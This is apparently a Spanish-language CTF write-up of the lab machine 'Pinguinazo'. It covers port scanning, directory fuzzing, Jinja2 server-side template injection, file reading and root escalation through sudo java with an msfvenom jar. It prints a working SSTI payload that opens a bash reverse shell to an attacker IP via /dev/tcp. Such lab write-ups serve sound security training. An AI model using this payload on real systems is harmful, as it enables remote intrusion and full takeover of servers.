# Pinguinazo

![Image](https://github.com/user-attachments/assets/6a3b1f69-6c33-4c25-ab22-0fa5a12956f4)

## Reconocimiento

Tras comprobar que tenemos conectividad con la máquina procedemos a escanear los puertos que están abiertos con **Nmap**:

![Image](https://github.com/user-attachments/assets/586658bb-a7ee-4de7-ace8-8111a88e6ed3)

En el primer escaneo podemos observar, por un lado que se trata de una máquina Linux (debido al TTL de 64) y por otro que tiene un servicio activo por el puerto 5000 por lo que haremos un escaneo más exhaustivo para identificar este

![Image](https://github.com/user-attachments/assets/8ee4df98-9f92-4305-ab62-d31a292cd64c)

Como podemos ver en este segundo escaneo el servicio que corre por este puerto es un servidor http.

Con la herramienta **WhatWeb** podemos identificar las tecnologías que está utilizando este servicio web y vemos tanto un email que puede ser interesante como la version de Python:

![Image](https://github.com/user-attachments/assets/1bd1680b-f04f-46d9-b02c-27964acaa304)

Accedemos a la pagina web y vemos que tiene una especie de panel de registro:

![Image](https://github.com/user-attachments/assets/2d1a469c-7d2f-4b2e-99b9-4625fc40e3f4)

Antes de interactuar con el panel hacemos fuzzing para identificar directorios expuestos que puedan ser útiles, para lo cual utilizamos **gobuster** y encontramos un directorio */console*:

```gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2:5000/ -t 20```

![Image](https://github.com/user-attachments/assets/f7273646-d83a-460e-aa73-89542f2b4333)

Al parecer nos pide un PIN para poder interactuar con la consola por lo que volvemos al panel anterior para ver como interactúa. Teniendo en cuenta que vimos que utilizaba Python y que responde mostrando el campo PinguNombre podemos tratar de inyectar comandos

![Image](https://github.com/user-attachments/assets/9b32a9c0-daf7-4a87-a33a-278b370d5027)

Una vez hemos detectado que ejecuta comandos, aunque no hemos conseguido identificar con **WhatWeb** cuál es la plantilla que está empleando el servicio web podemos utilizar la información del repositorio de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md) correspondiente al **SSTI(Server Side Template Injection)** para explotar esta vulnerabilidad.

## Explotación

Utilizamos los siguientes payloads para identificar la plantilla:

![Image](https://github.com/user-attachments/assets/890b06e6-9db5-479b-83d0-26fcd3e43eaa)

Tras ver que el primer comando es el que da error identificamos que se trata de un Jinja2. Pasamos a ver si tenemos capacidad de lectura de archivos con los siguientes comandos:

![Image](https://github.com/user-attachments/assets/7000d9b6-e155-4392-b4cb-ec7b1e0728e4)

Al parecer si podemos leer el archivo */etc/passwd* del cual sacamos que existe un usuario *pinguinazo*

![Image](https://github.com/user-attachments/assets/fd270022-26df-4d96-bcf1-5a276db0e4e9)

Si estuviese el servicio SSH activo podríamos intentar crackear la contraseña con **Hydra** por ejemplo, pero como no es el caso vamos a probar si tenemos capacidad de ejecución de comandos

![Image](https://github.com/user-attachments/assets/fdbf4348-02eb-4bb5-9876-869e28e7a95d)

En la respuesta vemos el resultado del comando "id" por lo que confirmamos la ejecución de comandos

![Image](https://github.com/user-attachments/assets/64cc7d21-eaf9-4e5b-8791-dd4d7dd6235a)

Procedemos entonces a entablarnos una reverse shell tras ponernos en escucha con **Netcat** por el puerto 443 con el siguiente comando:

```{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.0.2.6/443 0>&1"').read() }}```

## Escalada de privilegios

Una vez estamos dentro de la máquina víctima debemos hacer un tratamiento de la tty para poder trabajar de una manera más eficiente y clara. Para esto tendremos que utilizar los siguientes comandos:

- `script /dev/null -c bash`
- ctrl + z (para poner el proceso en segundo plano)
- `stty raw -echo; fg`
- `reset xterm`
- `export TERM=xterm`
- `export SHELL=bash`
- `stty rows x columns y` (donde x e y son las filas y columnas de tu terminal habitual, para comprobarlo utiliza en una consola aparte stty size)

Tras esto consultamos si tenemos algún permiso para ejecutar comandos como *root* y efectivamente podemos ejecutar */usr/bin/java*

![Image](https://github.com/user-attachments/assets/77e6c78d-07e7-4043-85fc-7995a9d159c8)

Una forma de aprovechar esto es crear con **msfvenom** un archivo .jar que establezca otra reverse shell pero esta vez como root

![Image](https://github.com/user-attachments/assets/7f321606-47b4-4330-8a7f-839e24c52411)

Para enviarnos este archivo a la máquina víctima utilizamos **curl** y una vez la tenemos solo falta ejecutar dicho archivo tras ponernos en escucha de nuevo con **Netcat** pero en esta ocasion por el puerto 4444:

![Image](https://github.com/user-attachments/assets/101a235a-27c4-4271-bc9c-185415da698e)

Una vez hecho esto en la nueva consola seríamos el usuario *root* y tendríamos acceso total a la máquina.

![Image](https://github.com/user-attachments/assets/3ebbc092-5291-4346-8a28-8d375c1d07c8)

